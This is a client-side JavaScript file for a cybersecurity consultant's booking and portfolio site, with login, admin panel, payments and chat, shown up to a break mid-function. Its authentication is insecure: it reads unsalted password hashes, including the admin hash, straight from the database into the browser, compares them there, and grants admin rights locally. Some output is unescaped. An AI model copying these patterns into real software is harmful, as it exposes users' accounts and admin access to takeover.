// ====== CONFIG — all credentials fetched from server, zero secrets in source ======
var sb = null;
var ADMIN_EMAIL = '';
var _configReady = (async function loadConfig(){
  // Disable buttons while Supabase connects (prevents click before sb is ready)
  ['loginBtn','signupBtn'].forEach(function(id){
    var el=document.getElementById(id);
    if(el){el.disabled=true;el.dataset.orig=el.textContent;el.textContent='...';}
  });
  try {
    var r = await fetch('/api/config');
    if(!r.ok) throw new Error('HTTP '+r.status);
    var c = await r.json();
    if(!c.supaUrl || !c.supaKey) throw new Error('Incomplete config');
    if(typeof supabase==='undefined') throw new Error('Supabase SDK not loaded');
    sb = supabase.createClient(c.supaUrl, c.supaKey);
    ADMIN_EMAIL = c.adminEmail;
  } catch(err) {
    console.error('Config load failed:', err);
    var errEl = document.getElementById('authErr');
    if(errEl) errEl.textContent = 'সাইট লোড হয়নি। Page refresh করুন।';
  } finally {
    // Re-enable buttons regardless of success or failure
    ['loginBtn','signupBtn'].forEach(function(id){
      var el=document.getElementById(id);
      if(el){el.disabled=false;el.textContent=el.dataset.orig||el.textContent;}
    });
  }
})();

// ====== CONSTANTS ======
var currentUser = null;
var chatHistory = [];
var chatOpen = false;
var selectedService = '';
var selectedSlot = '';
var activeAdminChatUser = null;
var selectedStars = 0;
var selPayMethod = '';

// SHA-256 password hash (browser SubtleCrypto)
async function hashPass(p){
  var buf=await crypto.subtle.digest('SHA-256',new TextEncoder().encode(p));
  return Array.from(new Uint8Array(buf)).map(function(b){return b.toString(16).padStart(2,'0');}).join('');
}

// XSS sanitizer — escapes all user-supplied strings before innerHTML
function sanitize(str){
  if(str===null||str===undefined)return '';
  return String(str).replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;').replace(/"/g,'&quot;').replace(/'/g,'&#x27;').replace(/\//g,'&#x2F;');
}

// Input validators
function isValidEmail(e){return /^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(e);}
function isValidLength(s,min,max){var l=s.trim().length;return l>=min&&l<=max;}

// Login rate limiting (max 5 attempts per 10 min)
var loginAttempts=JSON.parse(localStorage.getItem('ki_attempts')||'{"count":0,"ts":0}');
function checkRateLimit(){
  var now=Date.now();
  // Reset window if 10 minutes passed since first failed attempt
  if(loginAttempts.ts&&now-loginAttempts.ts>600000){loginAttempts={count:0,ts:0};}
  if(loginAttempts.count>=5){
    var wait=Math.ceil((600000-(now-loginAttempts.ts))/60000);
    document.getElementById('authErr').textContent='অনেক চেষ্টা হয়েছে। '+wait+' মিনিট পর আবার চেষ্টা করুন।';
    return false;
  }
  return true;
}
function recordFailedAttempt(){
  if(!loginAttempts.ts)loginAttempts.ts=Date.now(); // start window on first failure
  loginAttempts.count++;
  localStorage.setItem('ki_attempts',JSON.stringify(loginAttempts));
}
function resetAttempts(){loginAttempts={count:0,ts:0};localStorage.setItem('ki_attempts',JSON.stringify(loginAttempts));}

function getTime(){var n=new Date();return n.getHours()+':'+String(n.getMinutes()).padStart(2,'0');}

// ====== AUTH ======
function switchTab(t){
  document.getElementById('lTab').className='auth-tab'+(t==='l'?' active':'');
  document.getElementById('sTab').className='auth-tab'+(t==='s'?' active':'');
  document.getElementById('lForm').style.display=t==='l'?'block':'none';
  document.getElementById('sForm').style.display=t==='s'?'block':'none';
  document.getElementById('authErr').textContent='';
}

async function doLogin(){
  await _configReady;
  if(!sb){document.getElementById('authErr').textContent='সাইট লোড হয়নি। Page refresh করুন।';return;}
  if(!checkRateLimit())return;
  var btn=document.getElementById('loginBtn');
  if(btn.disabled)return;

  var e=document.getElementById('lEmail').value.trim().toLowerCase(); // Fix #1: normalize email
  var p=document.getElementById('lPass').value;
  if(!e||!p){document.getElementById('authErr').textContent='Email ও Password দিন।';return;}
  if(!isValidEmail(e)){document.getElementById('authErr').textContent='সঠিক Email দিন।';return;}
  if(!isValidLength(p,6,128)){document.getElementById('authErr').textContent='Password কমপক্ষে ৬ অক্ষর।';return;}

  // Fix #3: disable button to prevent double-click
  btn.disabled=true;btn.textContent='Loading...';
  document.getElementById('authErr').textContent='';

  try{
    var hashed=await hashPass(p);

    if(e===ADMIN_EMAIL){
      var {data:adminRow,error:aErr}=await sb.from('admin_settings').select('value').eq('key','admin_pass').maybeSingle();
      if(aErr){console.error('Admin check error:',aErr);document.getElementById('authErr').textContent='সার্ভার সমস্যা। পুনরায় চেষ্টা করুন।';return;}
      var adminPass=adminRow?adminRow.value:'';
      if(adminPass&&hashed===adminPass){
        resetAttempts();
        currentUser={email:e,role:'admin',name:'Khairul Islam'};
        loginSuccess();return;
      }
      recordFailedAttempt();
      document.getElementById('authErr').textContent='Email বা Password ভুল।';
      return;
    }

    // Regular user — use maybeSingle() so 0 rows returns null cleanly (no PGRST116 error)
    var {data:user,error:uErr}=await sb.from('users').select('*').eq('email',e).maybeSingle();
    if(uErr){console.error('Login user lookup error:',uErr);document.getElementById('authErr').textContent='সার্ভার সমস্যা। পুনরায় চেষ্টা করুন।';return;}
    if(user&&user.pass===hashed){
      resetAttempts();
      currentUser={email:e,role:'user',name:user.name||e.split('@')[0]};
      loginSuccess();
    } else {
      recordFailedAttempt();
      document.getElementById('authErr').textContent='Email বা Password ভুল।';
    }
  }catch(err){
    console.error('Login error:',err);
    document.getElementById('authErr').textContent='অপ্রত্যাশিত সমস্যা। পুনরায় চেষ্টা করুন।';
  }finally{
    btn.disabled=false;btn.textContent='Login →';
  }
}

async function doSignup(){
  await _configReady;
  if(!sb){document.getElementById('authErr').textContent='সাইট লোড হয়নি। Page refresh করুন।';return;}
  var btn=document.getElementById('signupBtn');
  if(btn.disabled)return;

  var name=document.getElementById('sName').value.trim();
  var e=document.getElementById('sEmail').value.trim().toLowerCase(); // Fix #1: normalize email
  var p=document.getElementById('sPass').value;
  var pc=document.getElementById('sPassConfirm').value;

  if(!name||!e||!p||!pc){document.getElementById('authErr').textContent='সব ফিল্ড পূরণ করুন।';return;}
  if(!isValidLength(name,2,50)){document.getElementById('authErr').textContent='নাম ২-৫০ অক্ষরের মধ্যে হতে হবে।';return;}
  if(!isValidEmail(e)){document.getElementById('authErr').textContent='সঠিক Email দিন।';return;}
  if(!isValidLength(p,6,128)){document.getElementById('authErr').textContent='Password কমপক্ষে ৬ অক্ষর।';return;}
  // Fix #5: confirm password check
  if(p!==pc){document.getElementById('authErr').textContent='Password দুটো মিলছে না।';return;}
  if(e===ADMIN_EMAIL){document.getElementById('authErr').textContent='এই email ব্যবহার করা যাবে না।';return;}

  btn.disabled=true;btn.textContent='Creating...';
  document.getElementById('authErr').textContent='';

  try{
    // Bug fix: use maybeSingle() — returns {data:null, error:null} for 0 rows
    // .single() incorrectly returns PGRST116 error for 0 rows in Supabase SDK v2
    var {data:existing,error:findErr}=await sb.from('users').select('id').eq('email',e).maybeSingle();
    if(findErr){
      console.error('User lookup error:',findErr);
      document.getElementById('authErr').textContent='সার্ভার সমস্যা। পুনরায় চেষ্টা করুন।';
      return;
    }
    if(existing){document.getElementById('authErr').textContent='Email ইতিমধ্যে registered।';return;}

    var hashed=await hashPass(p);

    // Bug fix: safe join_date with fallback if bn-BD locale unsupported
    var joinDate='';
    try{joinDate=new Date().toLocaleDateString('bn-BD');}catch(le){joinDate=new Date().toISOString().split('T')[0];}

    var {error:insertErr}=await sb.from('users').insert({name:name,email:e,pass:hashed,phone:'',join_date:joinDate});
    if(insertErr){
      console.error('Signup insert error:',insertErr);
      // 23505 = unique_violation — duplicate email from race condition
      var msg=insertErr.code==='23505'?'Email ইতিমধ্যে registered।':'Registration ব্যর্থ হয়েছে। পুনরায় চেষ্টা করুন।';
      document.getElementById('authErr').textContent=msg;
      return;
    }

    currentUser={email:e,role:'user',name:name};
    loginSuccess();
  }catch(err){
    console.error('Signup unexpected error:',err);
    document.getElementById('authErr').textContent='অপ্রত্যাশিত সমস্যা। পুনরায় চেষ্টা করুন।';
  }finally{
    btn.disabled=false;btn.textContent='Create Account →';
  }
}

function loginSuccess(){
  document.getElementById('authOverlay').style.display='none';
  document.getElementById('mainSite').style.display='block';
  document.getElementById('chatFab').style.display='flex';
  var tb=document.getElementById('topBar');
  tb.style.display='flex';
  document.getElementById('tbEmail').textContent=currentUser.email;
  document.getElementById('mainNav').style.marginTop='38px';
  if(currentUser.role==='admin'){
    document.getElementById('adminBtn').style.display='inline-block';
    setTimeout(function(){var cs=document.getElementById('certUploadSection');if(cs)cs.style.display='block';},800);
  } else {
    document.getElementById('dashBtn').style.display='inline-block';
  }
  initSite();
}

async function skipAuth(){
  await _configReady;
  currentUser={email:'guest',role:'guest',name:'Guest'};
  document.getElementById('authOverlay').style.display='none';
  document.getElementById('mainSite').style.display='block';
  document.getElementById('chatFab').style.display='flex';
  document.getElementById('mainNav').style.marginTop='0';
  initSite();
}

function doLogout(){
  currentUser=null;chatHistory=[];
  ['mainSite','topBar','chatFab','adminOverlay','dashOverlay'].forEach(function(id){
    var el=document.getElementById(id);if(el)el.style.display='none';
  });
  document.getElementById('chatWin').style.display='none';
  document.getElementById('chatMsgs').innerHTML='';
  document.getElementById('authOverlay').style.display='flex';
  document.getElementById('mainNav').style.marginTop='0';
  document.getElementById('adminBtn').style.display='none';
  document.getElementById('dashBtn').style.display='none';
  document.getElementById('authErr').textContent='';
  chatOpen=false;
  // Fix #7: clear all auth form fields on logout
  ['lEmail','lPass','sName','sEmail','sPass','sPassConfirm'].forEach(function(id){
    var el=document.getElementById(id);if(el)el.value='';
  });
  switchTab('l');
}

// ====== ADMIN ======
function openAdmin(){renderAdminContent();document.getElementById('adminOverlay').style.display='flex';}
function closeAdmin(){document.getElementById('adminOverlay').style.display='none';}

function switchAdminTab(t){
  document.querySelectorAll('.admin-tab').forEach(function(el){el.className='admin-tab';});
  document.querySelectorAll('.admin-panel').forEach(function(el){el.className='admin-panel';});
  var tabs=['stats','users','bookings','videos','reviews','chats','settings'];
  var idx=tabs.indexOf(t);
  if(idx>=0)document.querySelectorAll('.admin-tab')[idx].className='admin-tab active';
  document.getElementById('ap-'+t).className='admin-panel active';
  renderAdminContent();
  if(t==='reviews')renderAdminReviews();
}

async function renderAdminReviews(){
  var {data:reviews}=await sb.from('reviews').select('*').order('created_at',{ascending:false});
  reviews=reviews||[];
  var el=document.getElementById('adminReviewList');if(!el)return;
  if(!reviews.length){el.innerHTML='<div style="font-size:12px;color:var(--muted);padding:10px;">কোনো review নেই।</div>';return;}
  el.innerHTML=reviews.map(function(r){
    return '<div class="bkrow"><div class="bkinfo"><div class="bk-user-txt">'+sanitize(r.name)+' ('+sanitize(r.email)+')</div><div class="bk-det">'+'★'.repeat(r.stars)+' — "'+sanitize(r.text.substring(0,60))+'"</div></div><div class="bk-action-btns">'+(!r.approved?'<button class="confirm-btn" onclick="approveReview('+r.id+')">✓ Approve</button>':'<span style="color:var(--green);font-size:11px;">✓ Approved</span>')+'<button class="reject-btn" onclick="deleteReview('+r.id+')">Del</button></div></div>';
  }).join('');
}

async function renderAdminContent(){
  var [{data:users},{data:bookings},{data:videos},{data:chatsRaw},{data:settings}]=await Promise.all([
    sb.from('users').select('*'),
    sb.from('bookings').select('*').order('created_at',{ascending:false}),
    sb.from('videos').select('*').order('created_at',{ascending:false}),
    sb.from('chats').select('user_email').order('created_at',{ascending:false}),
    sb.from('settings').select('*').eq('id',1).single()
  ]);
  users=users||[];bookings=bookings||[];videos=videos||[];chatsRaw=chatsRaw||[];

  // Unique chat users
  var chatUsers=[...new Set((chatsRaw||[]).map(function(c){return c.user_email;}))];
  var pend=(bookings||[]).filter(function(b){return b.status==='pending';}).length;

  document.getElementById('as-users').textContent=users.length;
  document.getElementById('as-bookings').textContent=bookings.length;
  document.getElementById('as-pending').textContent=pend;
  document.getElementById('as-videos').textContent=videos.length;
  document.getElementById('as-chats').textContent=chatUsers.length;

  var em=ADMIN_EMAIL;var masked=em[0]+'●●●●@'+em.split('@')[1];
  var sel=document.getElementById('showAdminEmail');if(sel)sel.textContent=masked;

  // Users list
  var ul=document.getElementById('adminUserList');
  ul.innerHTML='<div class="user-row"><span class="user-email-txt">'+ADMIN_EMAIL+'</span><span class="role-badge admin">Admin</span></div>';
  users.forEach(function(u){ul.innerHTML+='<div class="user-row"><div><div class="user-email-txt">'+sanitize(u.email)+'</div><div style="font-size:10px;color:var(--muted);">'+sanitize(u.name)+'</div></div><div style="display:flex;gap:6px;align-items:center;"><span class="role-badge user">User</span><button class="del-btn" onclick="delUser(\''+sanitize(u.id)+'\')">Del</button></div></div>';});

  // Bookings
  var bl=document.getElementById('adminBookingList');
  if(!bookings.length){bl.innerHTML='<div style="font-size:12px;color:var(--muted);padding:10px;">কোনো booking নেই।</div>';}
  else{bl.innerHTML=bookings.map(function(b){return '<div class="booking-admin-row"><div class="bk-info"><div class="bk-user">'+sanitize(b.email)+'</div><div class="bk-detail">'+sanitize(b.service)+' · '+sanitize(b.date)+' '+sanitize(b.slot)+'</div></div><div class="bk-action-btns"><span class="bk-status '+sanitize(b.status)+'">'+sanitize(b.status)+'</span>'+(b.status==='pending'?'<button class="confirm-btn" onclick="updateBooking('+b.id+',\'confirmed\')">✓</button><button class="reject-btn" onclick="updateBooking('+b.id+',\'cancelled\')">✗</button>':'')+'</div></div>';}).join('');}

  // Videos
  var vl=document.getElementById('adminVideoList');
  vl.innerHTML=videos.map(function(v){return '<div class="vla-item"><div><div class="vla-title">'+sanitize(v.title)+'</div><div class="vla-url">'+sanitize(v.access)+'</div></div><button class="del-btn" onclick="delVideo('+v.id+')">Del</button></div>';}).join('')||'<div style="font-size:11px;color:var(--muted);padding:8px;">কোনো ভিডিও নেই।</div>';

  // Chats
  var cl=document.getElementById('adminChatList');
  if(!chatUsers.length){cl.innerHTML='<div style="font-size:12px;color:var(--muted);">কোনো message নেই।</div>';}
  else{cl.innerHTML=chatUsers.map(function(email){return '<div class="admin-chat-item"'+(activeAdminChatUser===email?' style="border-color:var(--cyan);"':'')+' onclick="selectAdminChat(\''+sanitize(email)+'\')"><div class="aci-email">'+sanitize(email)+'</div><div class="aci-preview">Click to view messages</div></div>';}).join('');}

  // Settings
  if(settings){
    var ss=document.getElementById('setStatus');if(ss)ss.value=settings.status||'available';
    var an=document.getElementById('announcement');if(an)an.value=settings.announcement||'';
  }
}

function selectAdminChat(email){
  activeAdminChatUser=email;
  document.getElementById('adminChatReply').style.display='block';
  document.getElementById('replyingTo').textContent='Replying to: '+email;
  renderAdminContent();
}

async function sendAdminReply(){
  if(!activeAdminChatUser)return;
  var txt=document.getElementById('adminReplyInput').value.trim().substring(0,1000);
  if(!txt)return;
  await sb.from('chats').insert({user_email:activeAdminChatUser,from_role:'admin',message:txt,time:getTime()});
  document.getElementById('adminReplyInput').value='';
  renderAdminContent();
}

async function delUser(id){
  await sb.from('users').delete().eq('id',id);
  renderAdminContent();
}

async function updateBooking(id,status){
  await sb.from('bookings').update({status}).eq('id',id);
  renderAdminContent();
}

async function addVideo(){
  var t=document.getElementById('vTitle').value.trim();
  var u=document.getElementById('vUrl').value.trim();
  var d=document.getElementById('vDesc').value.trim();
  var a=document.getElementById('vAccess').value;
  if(!t||!u){alert('Title ও URL দিন।');return;}
  var embed=u;
  if(u.includes('watch?v='))embed='https://www.youtube.com/embed/'+u.split('v=')[1].split('&')[0];
  else if(u.includes('youtu.be/'))embed='https://www.youtube.com/embed/'+u.split('youtu.be/')[1].split('?')[0];
  await sb.from('videos').insert({title:t,url:embed,description:d,access:a});
  document.getElementById('vTitle').value='';document.getElementById('vUrl').value='';document.getElementById('vDesc').value='';
  renderAdminContent();renderVideoGrid();
}

async function delVideo(id){
  await sb.from('videos').delete().eq('id',id);
  renderAdminContent();renderVideoGrid();
}

async function changeAdminPass(){
  var np=document.getElementById('newAdminPass').value;
  if(!np||np.length<8){alert('কমপক্ষে ৮ অক্ষর দিন।');return;}
  await sb.from('admin_settings').upsert({key:'admin_pass',value:await hashPass(np)});
  document.getElementById('newAdminPass').value='';
  alert('✅ Password updated!');
}

async function saveSettings(){
  var status=document.getElementById('setStatus').value;
  var title=document.getElementById('setTitle').value;
  await sb.from('settings').upsert({id:1,status,title});
  applySettings();alert('Saved!');
}

async function saveAnnouncement(){
  var announcement=document.getElementById('announcement').value;
  await sb.from('settings').upsert({id:1,announcement});
  applyAnnouncement(announcement);alert('Announcement posted!');
}

// ====== DASHBOARD ======
function openDashboard(){renderDashboard();document.getElementById('dashOverlay').style.display='flex';}
function closeDashboard(){document.getElementById('dashOverlay').style.display='none';}

function switchDbTab(t){
  document.querySelectorAll('.db-tab').forEach(function(el){el.className='db-tab';});
  document.querySelectorAll('.db-panel').forEach(function(el){el.className='db-panel';});
  var tabs=['profile','bookings','messages','notifications'];
  var idx=tabs.indexOf(t);
  if(idx>=0)document.querySelectorAll('.db-tab')[idx].className='db-tab active';
  document.getElementById('dp-'+t).className='db-panel active';
  if(t==='messages')renderPrivateChat();
  if(t==='bookings')renderMyBookings();
  if(t==='notifications')renderNotifications();
}

async function renderDashboard(){
  if(!currentUser||currentUser.role==='guest')return;
  var av=currentUser.name?currentUser.name[0].toUpperCase():'U';
  document.getElementById('profileAv').textContent=av;
  document.getElementById('profileName').textContent=currentUser.name||'User';
  document.getElementById('profileEmail').textContent=currentUser.email;
  document.getElementById('profileRole').textContent=currentUser.role==='admin'?'Admin':'Member';
  document.getElementById('profileRole').className='profile-role-badge '+(currentUser.role==='admin'?'role-admin':'role-user');

  var [{data:myBk},{data:myMsgs}]=await Promise.all([
    sb.from('bookings').select('id').eq('email',currentUser.email),
    sb.from('chats').select('id').eq('user_email',currentUser.email)
  ]);
  document.getElementById('ps-bookings').textContent=(myBk||[]).length;
  document.getElementById('ps-messages').textContent=(myMsgs||[]).length;

  var {data:u}=await sb.from('users').select('*').eq('email',currentUser.email).single();
  if(u){document.getElementById('editName').value=u.name||'';document.getElementById('editPhone').value=u.phone||'';}
  renderMyBookings();renderPrivateChat();renderNotifications();
}

async function saveProfile(){
  var name=document.getElementById('editName').value.trim();
  var phone=document.getElementById('editPhone').value.trim();
  var pass=document.getElementById('editPass').value;
  if(name&&!isValidLength(name,2,50)){alert('নাম ২-৫০ অক্ষরের মধ্যে হতে হবে।');return;}
  if(phone&&!isValidLength(phone,0,20)){alert('Phone নম্বর ২০ অক্ষরের বেশি হবে না।');return;}
  if(pass&&!isValidLength(pass,6,128)){alert('Password কমপক্ষে ৬ অক্ষর।');return;}
  var update={};
  if(name)update.name=name;
  if(phone)update.phone=phone;
  if(pass&&pass.length>=6)update.pass=await hashPass(pass);
  await sb.from('users').update(update).eq('email',currentUser.email);
  if(name){currentUser.name=name;document.getElementById('profileName').textContent=sanitize(name);}
  alert('Profile updated!');
}

async function renderMyBookings(){
  var {data:myBk}=await sb.from('bookings').select('*').eq('email',currentUser.email).order('created_at',{ascending:false});
  var el=document.getElementById('myBookingsList');
  if(!(myBk&&myBk.length)){el.innerHTML='<div style="font-size:12px;color:var(--muted);padding:12px;">কোনো booking নেই। <a href="#booking" onclick="closeDashboard()" style="color:var(--cyan);">Book করুন →</a></div>';return;}
  el.innerHTML=myBk.map(function(b){return '<div class="booking-row"><div><div class="bk-service">'+sanitize(b.service)+'</div><div class="bk-date">'+sanitize(b.date)+' · '+sanitize(b.slot)+'</div></div><span class="bk-status '+sanitize(b.status)+'">'+sanitize(b.status)+'</span></div>';}).join('');
}

async function renderPrivateChat(){
  if(!currentUser||currentUser.role==='guest')return;
  var {data:msgs}=await sb.from('chats').select('*').eq('user_email',currentUser.email).order('created_at',{ascending:true});
  var el=document.getElementById('privateChatMsgs');
  if(!(msgs&&msgs.length)){el.innerHTML='<div style="font-size:12px;color:var(--muted);padding:12px;text-align:center;">Khairul Islam-এর সাথে chat শুরু করুন।</div>';return;}
  el.innerHTML=msgs.map(function(m){return '<div class="pchat-msg '+(m.from_role==='admin'?'admin':'user')+'"><div class="pchat-bubble">'+sanitize(m.message)+'</div><div class="pchat-time">'+sanitize(m.time)+'</div></div>';}).join('');
  el.scrollTop=el.scrollHeight;
}

async function sendPrivateMsg(){
  if(!currentUser||currentUser.role==='guest')return;
  var inp=document.getElementById('privateChatInput');
  var txt=inp.value.trim().substring(0,1000);if(!txt)return;
  await sb.from('chats').insert({user_email:currentUser.email,from_role:'user',message:txt,time:getTime()});
  inp.value='';renderPrivateChat();
}

async function renderNotifications(){
  var el=document.getElementById('notificationList');
  var notes=[];
  var [{data:myBk},{data:adminMsgs},{data:settings}]=await Promise.all([
    sb.from('bookings').select('*').eq('email',currentUser.email),
    sb.from('chats').select('*').eq('user_email',currentUser.email).eq('from_role','admin'),
    sb.from('settings').select('announcement').eq('id',1).single()
  ]);
  if(myBk&&myBk.length){myBk.forEach(function(b){notes.push({ic:'📅',txt:'Booking: <strong>'+sanitize(b.service)+'</strong> — Status: <span style="color:'+(b.status==='confirmed'?'var(--green)':b.status==='cancelled'?'var(--red)':'var(--gold)')+'">'+sanitize(b.status)+'</span>',time:sanitize(b.date)});});}
  if(adminMsgs&&adminMsgs.length){notes.push({ic:'💬',txt:'Khairul Islam-এর <strong>'+adminMsgs.length+'টি</strong> reply আছে।',time:'Recently'});}
  if(settings&&settings.announcement){notes.push({ic:'📢',txt:'<strong>Announcement:</strong> '+settings.announcement,time:'Admin'});}
  if(!notes.length){el.innerHTML='<div style="font-size:12px;color:var(--muted);padding:14px;">কোনো notification নেই।</div>';return;}
  el.innerHTML=notes.map(function(n){return '<div class="notification"><div class="notif-ic">'+n.ic+'</div><div><div class="notif-txt">'+n.txt+'</div><div class="notif-time">'+n.time+'</div></div></div>';}).join('');
}

// ====== BOOKING ======
function renderBookingSection(){
  var el=document.getElementById('bookingContent');
  var isLoggedIn=currentUser&&currentUser.role!=='guest';
  if(!isLoggedIn){
    el.innerHTML='<div class="exclusive-lock"><div class="lock-ic">🔐</div><div class="lock-title">Login করুন Booking-এর জন্য</div><div class="lock-desc">Appointment book করতে অ্যাকাউন্ট তৈরি করুন বা login করুন।</div><button class="btn-primary" style="max-width:200px;margin:0 auto;" onclick="document.getElementById(\'authOverlay\').style.display=\'flex\';">Login / Sign Up</button></div>';
    return;
  }
  el.innerHTML='<div class="booking-grid">'+
  '<div class="booking-info"><div class="bi-title">Service বেছে নিন</div><div class="service-options" id="serviceOptions">'+
  ['Penetration Testing — ৳১৫,০০০+','Web Development — ৳২০,০০০+','Security Audit — ৳১০,০০০+','Bug Bounty — Custom','Training & CTF — ৳৫,০০০/hr+','OSINT Research — ৳৮,০০০+'].map(function(s,i){var name=s.split(' — ')[0];var price=s.split(' — ')[1];return '<div class="srv-opt" id="sopt'+i+'" onclick="selectSvc(\''+name+'\','+i+')"><span class="srv-opt-name">'+name+'</span><span class="srv-opt-price">'+price+'</span></div>';}).join('')+'</div></div>'+
  '<div class="booking-form"><div class="book-title">Date & Time বেছে নিন</div>'+
  '<div class="form-field"><label>Date</label><input type="date" id="bookDate" min="'+new Date().toISOString().split('T')[0]+'" style="background:var(--bg3);border:1px solid var(--border);color:var(--text);padding:10px;border-radius:4px;width:100%;outline:none;font-size:12px;"/></div>'+
  '<div class="timeslots" id="timeSlots">'+
  ['10:00 AM','11:00 AM','12:00 PM','2:00 PM','3:00 PM','4:00 PM','5:00 PM','6:00 PM'].map(function(s){return '<div class="slot" onclick="selectSlot(this,\''+s+'\')">'+s+'</div>';}).join('')+
  '</div>'+
  '<div class="form-field"><label>Message (Optional)</label><textarea id="bookMsg" placeholder="প্রজেক্ট সম্পর্কে সংক্ষেপে লিখুন..." style="background:var(--bg3);border:1px solid var(--border);color:var(--text);padding:10px;border-radius:4px;width:100%;outline:none;font-size:12px;resize:none;min-height:70px;font-family:DM Sans,sans-serif;"></textarea></div>'+
  '<button class="btn-gold" onclick="submitBooking()">📅 Booking Confirm করুন</button>'+
  '</div></div>'+
  '<div class="my-bookings" id="bookingListDisplay"><div class="mb-title">// আমার সাম্প্রতিক Bookings</div><div id="recentBookings"></div></div>';
  renderRecentBookings();
}

function selectSvc(name,idx){
  selectedService=name;
  document.querySelectorAll('.srv-opt').forEach(function(el){el.className='srv-opt';});
  document.getElementById('sopt'+idx).className='srv-opt selected';
}
function selectSlot(el,slot){
  selectedSlot=slot;
  document.querySelectorAll('.slot').forEach(function(s){s.className='slot';});
  el.className='slot sel';
}

async function submitBooking(){
  if(!selectedService){showToast('wrn','⚠️','Service বেছে নিন।');return;}
  var date=document.getElementById('bookDate').value;
  if(!date){showToast('wrn','⚠️','Date দিন।');return;}
  // Prevent past dates
  if(date<new Date().toISOString().split('T')[0]){showToast('wrn','⚠️','ভবিষ্যতের date দিন।');return;}
  if(!selectedSlot){showToast('wrn','⚠️','Time slot বেছে নিন।');return;}
  var msg=document.getElementById('bookMsg').value.substring(0,500); // limit message
  var bkId=Date.now();
  var {error}=await sb.from('bookings').insert({id:bkId,email:currentUser.email,name:currentUser.name,service:selectedService,date,slot:selectedSlot,msg,status:'pending',payment:'unpaid'});
  if(error){showToast('wrn','⚠️','Booking ব্যর্থ হয়েছে।');return;}
  showToast('ok','✅','Booking জমা হয়েছে! Payment করুন।');
  sendTelegramNotify('📅 নতুন Booking!\nService: '+selectedService+'\nDate: '+date+' '+selectedSlot+'\nClient: '+currentUser.email);
  renderRecentBookings();
}

async function submitPayment(){
  if(!selPayMethod){showToast('wrn','⚠️','Payment method বেছে নিন।');return;}
  var trx=document.getElementById('trxId').value.trim();
  var amt=document.getElementById('trxAmt').value.trim();
  if(!trx||trx.length<6||trx.length>30||!/^[A-Za-z0-9]+$/.test(trx)){showToast('wrn','⚠️','সঠিক Transaction ID দিন (৬-৩০ alphanumeric)।');return;}
  var amtNum=parseFloat(amt);
  if(!amt||isNaN(amtNum)||amtNum<=0||amtNum>500000){showToast('wrn','⚠️','সঠিক Amount দিন।');return;}
  var {data:lastBk}=await sb.from('bookings').select('id').eq('email',currentUser.email).order('created_at',{ascending:false}).limit(1).single();
  if(lastBk){await sb.from('bookings').update({payment:'paid',trx_id:trx,trx_amt:amt,pay_method:selPayMethod}).eq('id',lastBk.id);}
  showToast('ok','✅','Payment জমা হয়েছে! Admin verify করবেন।');
  sendTelegramNotify('💳 Payment জমা!\nMethod: '+selPayMethod.toUpperCase()+'\nTrx ID: '+trx+'\nAmount: '+amt+'\nClient: '+currentUser.email);
  renderRecentBookings();
}

function selPay(method){
  selPayMethod=method;
  document.querySelectorAll('.pay-opt').forEach(function(el){el.className='pay-opt';});
  document.getElementById('po-'+method).className='pay-opt sel';
  var inst=document.getElementById('payInst');
  var txt=document.getElementById('payStepTxt');
  inst.className='pay-inst show';
  if(method==='bkash'){
    txt.innerHTML='<strong>bKash এ পাঠানোর ধাপ:</strong><br>① bKash App খোলো → Send Money<br>② Number: <strong>01XXXXXXXXX</strong> (Merchant)<br>③ Amount দাও → Reference: তোমার email<br>④ Transaction ID নিচে বসাও';
  } else {
    txt.innerHTML='<strong>Nagad এ পাঠানোর ধাপ:</strong><br>① Nagad App খোলো → Send Money<br>② Number: <strong>01XXXXXXXXX</strong><br>③ Amount দাও → Reference: তোমার email<br>④ Transaction ID নিচে বসাও';
  }
}

async function renderRecentBookings(){
  var el=document.getElementById('recentBookings');
  if(!el)return;
  var {data:myBk}=await sb.from('bookings').select('*').eq('email',currentUser.email).order('created_at',{ascending:false}).limit(3);
  if(!(myBk&&myBk.length)){el.innerHTML='<div style="font-size:12px;color:var(--muted);padding:8px;">কোনো booking নেই।</div>';return;}
  el.innerHTML=myBk.map(function(b){return '<div class="booking-row"><div><div class="bk-service">'+sanitize(b.service)+'</div><div class="bk-date">'+sanitize(b.date)+' · '+sanitize(b.slot)+'</div></div><span class="bk-status '+sanitize(b.status)+'">'+sanitize(b.status)+'</span></div>';}).join('');
}
function scrollToBooking(){document.getElementById('booking').scrollIntoView({behavior:'smooth'});}

// ====== EXCLUSIVE CONTENT ======
function renderExclusive(){
  var el=document.getElementById('exclusiveContent');
  var isLoggedIn=currentUser&&currentUser.role!=='guest';
  if(!isLoggedIn){
    el.innerHTML='<div class="exclusive-lock"><div class="lock-ic">🔐</div><div class="lock-title">Members-Only Content</div><div class="lock-desc">Login করলে exclusive cybersecurity resources, tools guide, এবং Khairul Islam-এর private notes দেখতে পাবেন।</div><button class="btn-primary" style="max-width:220px;margin:0 auto;" onclick="document.getElementById(\'authOverlay\').style.display=\'flex\';">Login করুন</button></div>';
    return;
  }
  el.innerHTML='<div class="exclusive-grid">'+
  '<div class="exc-card"><div class="exc-icon">📚</div><div class="exc-title">Security Cheatsheet</div><div class="exc-desc">Nmap, Burp Suite, Metasploit-এর advanced commands ও tips।</div><span class="exc-badge free">Free Member</span></div>'+
  '<div class="exc-card"><div class="exc-icon">🎯</div><div class="exc-title">CTF Writeups</div><div class="exc-desc">Past CTF challenges-এর বিস্তারিত writeup ও solution।</div><span class="exc-badge free">Free Member</span></div>'+
  '<div class="exc-card"><div class="exc-icon">🔧</div><div class="exc-title">Custom Tools</div><div class="exc-desc">Khairul Islam-এর নিজের তৈরি Python security scripts।</div><span class="exc-badge premium">Premium</span></div>'+
  '<div class="exc-card"><div class="exc-icon">🎓</div><div class="exc-title">Course Materials</div><div class="exc-desc">CEH ও OSCP preparation materials, notes, PDFs।</div><span class="exc-badge premium">Premium</span></div>'+
  '<div class="exc-card"><div class="exc-icon">💬</div><div class="exc-title">Private Chat</div><div class="exc-desc">Directly Khairul Islam-এর সাথে chat করুন।</div><span class="exc-badge free">Free Member</span></div>'+
  '<div class="exc-card"><div class="exc-icon">📅</div><div class="exc-title">Priority Booking</div><div class="exc-desc">Members-দের booking দ্রুত confirm করা হয়।</div><span class="exc-badge free">Free Member</span></div>'+
  '</div>';
}

// ====== VIDEO GRID ======
async function renderVideoGrid(){
  var el=document.getElementById('videoGrid');
  var isLoggedIn=currentUser&&currentUser.role!=='guest';
